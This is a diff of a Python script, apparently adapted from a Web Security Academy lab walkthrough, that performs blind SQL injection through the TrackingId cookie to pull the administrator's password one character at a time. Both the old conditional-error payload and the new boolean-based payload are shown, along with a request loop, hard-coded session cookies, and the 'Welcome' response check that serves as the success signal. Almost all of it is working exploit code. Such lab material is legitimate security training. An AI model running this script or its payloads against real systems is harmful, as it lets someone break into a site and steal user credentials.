@@ -1,5 +1,5 @@
 # Source - https://youtu.be/o__q8CzK2ts
-# Rana Khalil Web Security Academy
+# Rana Khalil Web Security Academy (used Blind SQLi w/conditional errors as starter)
 
 import sys
 import requests
@@ -19,15 +19,15 @@ def sqli_password(url):
     password_extracted = ""
     for i in range(1,21):
         for j in range(32,126): #Uses ASCII table for values, includes special characters
-            sqli_payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and ASCII(SUBSTR(password,{i}))='{j}') ||' "
+            sqli_payload = f"' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND (ASCII(SUBSTR(password,{i},1)) = '{j}'))='a'--"
             #print(sqli_payload)
             sqli_payload_encoded = urllib.parse.quote(sqli_payload)
             #print(sqli_payload_encoded)
-            cookies = {'TrackingId': '<TrackingId>' + sqli_payload_encoded, 'session': '<SessionId>'}
-            #print(cookies)
+            cookies = {'TrackingId': '2uYdJ1GuSfAC5M5B' + sqli_payload_encoded, 'session': 'XUHc9v3Ase5gffCR38EN0sVT6sMQpf4K'}
+            print(cookies)
             r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
             #print(r)
-            if r.status_code == 500:
+            if 'Welcome' in r.text:
                 password_extracted += chr(j)
                 sys.stdout.write('\r' + password_extracted)
                 sys.stdout.flush()
@@ -38,7 +38,7 @@ def sqli_password(url):
 
 def main ():
     if len(sys.argv) != 2:
-        print(f"(+) Usage: {sys.argv[0]} <url> <payload>")
+        print(f"(+) Usage: {sys.argv[0]} <url>")
         print(f"(+) Example: {sys.argv[0]} www.example.com")
         sys.exit(-1)
 
